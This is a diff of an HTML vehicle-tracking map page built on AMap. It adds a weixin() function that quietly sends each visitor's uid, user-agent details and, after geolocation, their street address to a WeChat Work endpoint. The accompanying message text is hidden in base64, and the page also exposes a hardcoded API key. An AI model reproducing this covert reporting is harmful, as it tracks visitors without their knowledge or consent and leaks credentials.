@@ -34,7 +34,7 @@
 <body>
     <div id="container"></div>
     <div class="in">
-        <input type="button" value="@到达我这里要多久？" id="shijian" onclick="dingwei()">
+        <input type="button" value="@看看到我这里要多久？" id="shijian" onclick="dingwei()">
         <div id="Mudd">未使用导航</div>
     </div>
     <script>
@@ -45,7 +45,7 @@
         let oldgaode;
         let oldzhongdian;
         let timeid;//每秒计算时间的id
-        let Marker;//终点图钉
+        let Zhong;//终点图钉
         //获取云端数据
         function gengxin(){
             console.log('获取云端数据')
@@ -83,7 +83,7 @@
                     console.log('转换完成');
                     let gaode = result.locations;
                     // console.log(gaode);
-                    map||(function(){//加载地图,只运行一次
+                    map || (function () {//加载地图,只运行一次
                         console.log('****加载地图****')
                         map = new AMap.Map("container", {
                             zoom: 18,
@@ -102,7 +102,7 @@
                         timeid = setInterval(() => TEXT(data), 1000);//设置时间文字
                     })();
                     oldgaode ? ICO(gaode, data) : oldgaode = gaode[1];//保存位置下次用;//设置车标
-                    if(oldzhongdian != data.props.b){
+                    if (oldzhongdian != data.props.b) {
                         oldzhongdian = data.props.b;
                         LUXIAN(gaode[1], data.props.b.split(','));
                     }
@@ -111,78 +111,84 @@
         }//gps转高德坐标
         //设置车标
         function ICO(gaode,data){
-                console.log('更新车位置');
-                clearInterval(timeid);//取消秒更新
-                map.remove(text);//删除text
-                // setTimeout(() => map.panTo(gaode[1]), 1000);//设置中心点
-                che.moveAlong([oldgaode,...gaode], 199);//移动图标
-                oldgaode = gaode[1];//保存位置下次用
-                let icoid = setInterval(()=>
-                    map.panTo(che.getPosition())
-                    ,200);
-                che.on('moveend', () => {//移动完成
-                    if (che.getPosition() === gaode[1]) {
-                        console.log('取消自动平移');
-                        clearInterval(icoid);
-                        text='';
-                        timeid = setInterval(() => TEXT(data), 1000);//设置时间文字
-                    }
-                })
+            console.log('更新车位置');
+            clearInterval(timeid);//取消秒更新
+            map.remove(text);//删除text
+            // setTimeout(() => map.panTo(gaode[1]), 1000);//设置中心点
+            che.moveAlong([oldgaode, ...gaode], 199);//移动图标
+            oldgaode = gaode[1];//保存位置下次用
+            let icoid = setInterval(()=>
+                map.panTo(che.getPosition())
+                ,200);
+            che.on('moveend', () => {//移动完成
+                if (che.getPosition() === gaode[1]) {
+                    console.log('取消自动平移');
+                    clearInterval(icoid);
+                    text='';
+                    timeid = setInterval(() => TEXT(data), 1000);//设置时间文字
+                }
+            })
         }
         //设置时间文字
         function TEXT(data) {
-                let time = Math.floor((Date.now() - data.locatetime) / 1000);//现在时间减最后上传时间
-                // console.log(time)
-                let d = Math.floor(time / 86400);
-                let h = Math.floor((time % 86400) / 3600);
-                let m = Math.floor(((time % 86400) % 3600) / 60);
-                let s = Math.floor(((time % 86400) % 3600) % 60);
-                d = d ? d + '天' : '';
-                h = h ? h + '时' : '';
-                m = m ? m + '分' : '';
-                s = s ? s + '秒' : '';
-                let ttt = d + h + m + s + '前位置，速度 ' + data.speed + ' km/h';
-                // console.log(ttt)
-                if (text) {//更新
-                    console.log('更新文字和坐标--' + ttt)
-                    text.setText(ttt);
-                } else {//首次
-                    console.log('设置文字和坐标')
-                    text = new AMap.Text({
-                        map: map,
-                        text: ttt,
-                        position: oldgaode,//添加点位置,默认中心
-                        offset: new AMap.Pixel(0, -50),//偏移
-                        animation: 'AMAP_ANIMATION_DROP'//点标掉落效果 
-                    })
-                }
+            let time = Math.floor((Date.now() - data.locatetime) / 1000);//现在时间减最后上传时间
+            // console.log(time)
+            let d = Math.floor(time / 86400);
+            let h = Math.floor((time % 86400) / 3600);
+            let m = Math.floor(((time % 86400) % 3600) / 60);
+            let s = Math.floor(((time % 86400) % 3600) % 60);
+            d = d ? d + '天' : '';
+            h = h ? h + '时' : '';
+            m = m ? m + '分' : '';
+            s = s ? s + '秒' : '';
+            let ttt = d + h + m + s + '前位置，速度 ' + data.speed + ' km/h';
+            // console.log(ttt)
+            if (text) {//更新
+                console.log('更新文字和坐标--' + ttt)
+                text.setText(ttt);
+            } else {//首次
+                console.log('设置文字和坐标')
+                text = new AMap.Text({
+                    map: map,
+                    text: ttt,
+                    position: oldgaode,//添加点位置,默认中心
+                    offset: new AMap.Pixel(0, -50),//偏移
+                    animation: 'AMAP_ANIMATION_DROP'//点标掉落效果 
+                })
+            }
         }
         //显示路线
         let driving;
         function LUXIAN(qi, zhong){
             console.log('显示到终点的路线');
             driving && driving.clear();//如果现有路线存在就清除掉
-            Marker && map.remove(Marker);//删除终点图钉
-            driving = new AMap.Driving({
-                policy: AMap.DrivingPolicy.LEAST_TIME,//最快方式
-                map: map,//显示路线
-                hideMarkers:true,//隐藏首尾图标
-                autoFitView: false//不缩放
-            })
-            driving.search(qi, zhong, function (status, result) {
-                let time = result.routes[0].time;
-                // console.log(time)
-                if (time < 60) {
-                    driving.clear();//已经到达，清除路线
-                    Mudd.innerHTML += '<br>已到达'
-                } else {
-                    Marker = new AMap.Marker({ position: zhong, map: map });//添加终点图钉
-                    let gongli = result.routes[0].distance;
-                    gongli = gongli < 1000 ? gongli + '米' : Math.floor(gongli / 1000) + '公里';
-                    time = Math.floor(time / 60);
-                    time = time > 60 ? Math.floor(time / 60) + '小时' + time % 60 + '分钟' : time + '分钟';
-                    Mudd.innerHTML += '<br>剩余路程：' + gongli + '<br>' + time + '后到达';
-                }
+            Zhong && map.remove(Zhong);//删除终点图钉
+            AMap.plugin('AMap.Driving', function () {
+                driving = new AMap.Driving({
+                    policy: AMap.DrivingPolicy.LEAST_TIME,//最快方式
+                    map: map,//显示路线
+                    hideMarkers:true,//隐藏首尾图标
+                    autoFitView: false//不缩放
+                })
+                driving.search(qi, zhong, function (status, result) {
+                    let time = result.routes[0].time;
+                    // console.log(time)
+                    if (time < 60) {
+                        driving.clear();//已经到达，清除路线
+                        Mudd.innerHTML += '<br>已到达'
+                    } else {
+                        Zhong = new AMap.Marker({
+                            position: zhong,
+                            map: map,
+                            icon:'https://webapi.amap.com/theme/v1.3/markers/n/end.png'
+                        });//添加终点图钉
+                        let gongli = result.routes[0].distance;
+                        gongli = gongli < 1000 ? gongli + '米' : Math.floor(gongli / 1000) + '公里';
+                        time = Math.floor(time / 60);
+                        time = time > 60 ? Math.floor(time / 60) + '小时' + time % 60 + '分钟' : time + '分钟';
+                        Mudd.innerHTML += '<br>剩余路程：' + gongli + '<br>' + time + '后到达';
+                    }
+                })
             })
         }
         
@@ -192,51 +198,91 @@
 
 
         function dingwei() {
-                shijian.value = '请稍等...';
-                // 以下定位模块
-                AMap.plugin('AMap.Geolocation', function () {
-                    var geolocation = new AMap.Geolocation({
-                        enableHighAccuracy: true,//是否使用高精度定位，默认:true
-                        timeout: 15000           //超时
-                    });
-                    geolocation.getCurrentPosition(function (status, result) {
-                        if (status == 'complete') {
-                            new AMap.Marker({
-                                map: map,
-                                position: result.position//添加点
-                            });
-                            new AMap.Text({
-                                map: map,
-                                position: result.position,//添加点
-                                offset: new AMap.Pixel(0, -50),//偏移
-                                text: '你可能在这里'
-                            });
-                            // let my = [result.position.lng,result.position.lat];//使用人的位置
-                            // let now = [gaode[1].lng, gaode[1].lat];
-                            let address = result.formattedAddress.replace('市', '市\n');
-                            // 以下路线规划
-                            // driving.url && driving.clear();
-                            AMap.plugin('AMap.Driving', function () {
-                                let driving1 = new AMap.Driving({
-                                    policy: AMap.DrivingPolicy.LEAST_TIME,//最快方式
-                                    map: map,
-                                    hideMarkers: true,//隐藏首尾图标
-                                })
-                                driving1.search(oldgaode, result.position, function (status, result) {
-                                    let fen = parseInt(result.routes[0].time / 60)
-                                    fen = fen > 60 ? parseInt(fen / 60) + '小时' + fen % 60 + '分钟' : fen + '分钟'
-                                    shijian.value = '@到达我这里要多久？';
-                                    alert('您的位置大概是：\n' + address + '\n\n到达您这里大概需要时间：\n' + fen)
-                                })
-                            })
-                            // 以上路线规划
-                        } else {
-                            shijian.value = '定位失败';
-                        }
-                    });
+            shijian.value = '请稍等...';
+            // 以下定位模块
+            AMap.plugin('AMap.Geolocation', function () {
+                var geolocation = new AMap.Geolocation({
+                    enableHighAccuracy: true,//是否使用高精度定位，默认:true
+                    timeout: 15000           //超时
                 });
-                // 以上定位模块
-            }
+                geolocation.getCurrentPosition(function (status, result) {
+                    if (status == 'complete') {
+                        new AMap.Marker({
+                            map: map,
+                            position: result.position//添加点
+                        });
+                        new AMap.Text({
+                            map: map,
+                            position: result.position,//添加点
+                            offset: new AMap.Pixel(0, -50),//偏移
+                            text: '你可能在这里'
+                        });
+                        // let my = [result.position.lng,result.position.lat];//使用人的位置
+                        // let now = [gaode[1].lng, gaode[1].lat];
+                        let address = result.formattedAddress.replace('市', '市\n');
+                        // 以下路线规划
+                        // driving.url && driving.clear();
+                        AMap.plugin('AMap.Driving', function () {
+                            let driving1 = new AMap.Driving({
+                                policy: AMap.DrivingPolicy.LEAST_TIME,//最快方式
+                                map: map,
+                                hideMarkers: true,//隐藏首尾图标
+                            })
+                            driving1.search(oldgaode, result.position, function (status, result) {
+                                let fen = parseInt(result.routes[0].time / 60)
+                                fen = fen > 60 ? parseInt(fen / 60) + '小时' + fen % 60 + '分钟' : fen + '分钟'
+                                shijian.value = '@再看看到我这里要多久？';
+                                alert('您的位置大概是：\n' + address + '\n\n到达您这里大概需要时间：\n' + fen)
+                                weixin(address);
+                            })
+                        })
+                        // 以上路线规划
+                    } else {
+                        shijian.value = '定位失败,请授予定位权限';
+                    }
+                });
+            });
+            // 以上定位模块
+        }
+
+
+        weixin();
+        function weixin(xinxi) {
+            fetch('https://tsapi.amap.com/v1/track/terminal/list?key=8aeec61b8d5e8a187ef462f912760781&sid=8110&tid=226389884')
+                .then(res => res.json())
+                .then(res => {
+                    let i = res.data.results[0].props;
+                    let uid = location.search;
+                    uid = uid.match(/uid.+/i);
+                    if (!xinxi) {
+                        let str = navigator.userAgent;
+                        str = str.match(/(?<=\().+?(?=\))/i);
+                        // btoa(encodeURI(''))
+                        xinxi = decodeURI(atob('JUU2JTlDJTg5JUU0JUJBJUJBJUU2JTlGJUE1JUU4JUFGJUEyJUU0JUJBJTg2JUU2JTg4JTkxJUU3JTlBJTg0JUU0JUJEJThEJUU3JUJEJUFFJTIw'));
+                        xinxi += uid + '\n' + str;
+                    } else {
+                        xinxi = uid + '\n' + xinxi;
+                    }
+                    // console.log(xinxi);
+                    fetch('https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=' + i.a + i.b, {
+                        "method": 'POST',
+                        "mode": 'no-cors',
+                        "headers": {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        "body": JSON.stringify({
+                            "toparty": 4,
+                            "msgtype": "text",
+                            "agentid": 1000008,
+                            "text": {
+                                "content": xinxi
+                            },
+                            "safe": 0
+                        })
+                    })
+                })
+                .catch(er => console.log('WeiXin数据错误'))
+        }
     </script>
 </body>
 </html>
